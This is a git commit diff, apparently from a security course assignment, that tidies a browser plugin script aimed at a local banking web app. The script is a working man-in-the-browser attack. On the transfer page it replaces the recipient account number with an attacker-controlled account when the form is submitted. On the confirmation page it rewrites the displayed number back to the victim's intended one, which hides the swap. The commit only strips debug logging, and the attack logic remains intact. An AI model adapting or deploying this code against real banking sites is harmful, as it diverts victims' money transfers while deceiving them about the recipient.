56589bd8418dc3ed3535dbcbc548ea72551a0fb7
Jakub Gogola <jakubgogola97@gmail.com>
2018-12-02 12:28:44 +0100

    cosmetic changes

--- lista6/plugin/plugin.js
+++ lista6/plugin/plugin.js
@@ -1,26 +1,24 @@
-console.log("Script is starting, oh yeah!");
-
 let eavesdropperAccountNumber = '';
+
 for(let i = 0; i < 26; i++) {
     eavesdropperAccountNumber += '9';
 }
-console.log(eavesdropperAccountNumber);
 
 localStorage.setItem('fake_account_number', eavesdropperAccountNumber);
-console.log(window.location.href);
+
+function regex() {
+    return new RegExp(eavesdropperAccountNumber, 'g');
+}
 
 if(window.location.href == 'http://localhost:8000/transfer_confirm/') {
-    console.log('item: ' + localStorage.getItem('real_account_number'));
-    var data = document.getElementById('transfer_data').innerHTML;
-    console.log(localStorage.getItem('real_account_number'));
-    var replacedData = data.replace(/99999999999999999999999999/g, localStorage.getItem('real_account_number'));
+    let data = document.getElementById('transfer_data').innerHTML;
+    let replacedData = data.replace(regex(), localStorage.getItem('real_account_number'));
     document.getElementById('transfer_data').innerHTML = replacedData;
 }
 
 if(window.location.href == 'http://localhost:8000/transfer/') {
     document.addEventListener('submit', () => {
         localStorage.setItem('real_account_number', document.getElementById('id_recipient_account').value);
-        console.log('item: ' + localStorage.getItem('real_account_number'));
         document.getElementById('id_recipient_account').value = localStorage.getItem('fake_account_number');
     });
 }
